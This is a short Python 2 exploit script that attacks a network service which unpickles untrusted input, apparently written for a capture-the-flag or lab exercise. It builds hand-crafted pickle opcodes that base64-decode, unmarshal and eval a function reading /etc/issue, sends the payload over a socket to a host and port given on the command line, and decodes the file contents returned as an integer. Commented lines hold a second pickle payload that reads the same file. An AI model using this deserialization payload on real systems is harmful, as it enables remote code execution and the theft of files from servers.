#!/usr/bin/env python

"""
Attack for unsafe pickle service.
We want to pickle stuff that will execute, read a file
and send backk the result, packed into an int.
"""

import sys
import cPickle
import base64
import marshal
import codeop


def string_to_int(s):
    """Convert a string into an integer"""

    s = bytes(s)
    result = 0
    for letter in s:
        result += ord(letter)
        result <<= 8
    return result >> 8  # compensate for the trailing 00


def int_to_string(i):
    out = []
    while i > 0:
        out.insert(0, chr(i % 256))
        i /= 256
    return ''.join(out)

# c__builtin__\ngetattr\n(c__builtin__\nopen\n(S'/etc/issue'\ntRS'read'\ntR(tR.


# sc_base = """\
# data = bytes(open(filename).read())
# res = 0
# for letter in data:
#     res += ord(letter)
#     res <<= 8
# return res >> 8
# """


def build_shellcode():
    def hack_this():
        data = bytes(open('/etc/issue').read())
        res = 0
        for letter in data:
            res += ord(letter)
            res <<= 8
        return res >> 8

    # my_code = compile(sc_base, filename='main.py', mode='exec')

    #print(type(my_code))
    marshalled = marshal.dumps(hack_this.func_code)

    ## We need to eval() this code.
    b64ed = base64.encodestring(marshalled)
    shellcode = ('(c__builtin__\neval\n'
                 '(cmarshal\nloads\n'
                 '(cbase64\ndecodestring\n'
                 '(S{0!r}\n'
                 'tR'  # call to base64.decodestring()
                 'tR'  # call to marshal.loads()
                 'tRl.'  # call to eval()
                 .format(b64ed))

    # types.FunctionType(code, globals(), 'name') should work as well

    # shellcode = ('cos\neval\n'
    #              '(cmarshal\nloads\n'
    #              '(cbase64\ndecodestring\n'
    #              '(S{0!r}\n'
    #              'tR'
    #              'tR'
    #              #'tR'
    #              '(S{1!r}\nt'  # args to inner function call
    #              'R.'
    #              .format(b64ed, filename))

    return shellcode


def attack(addr, port):
    ## The plan is: marshal the function, send some
    ## hand-crafted pickle code that will unmarshal
    ## and execute the function.

    shellcode = build_shellcode()
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((addr, port))
    sock.recv(1024)
    sock.send(shellcode)
    return sock.recv(1024)


#print(build_shellcode())

# sc = build_shellcode()
# upr = cPickle.loads(sc)
# print("Shell code length: {0}".format(len(sc)))
# print("Unpickle result: {0!r}".format(upr))
# print("Unpacked is: {0!r}".format(int_to_string(upr)))

result = attack(sys.argv[1], int(sys.argv[2]))
print(int_to_string(int(result)))
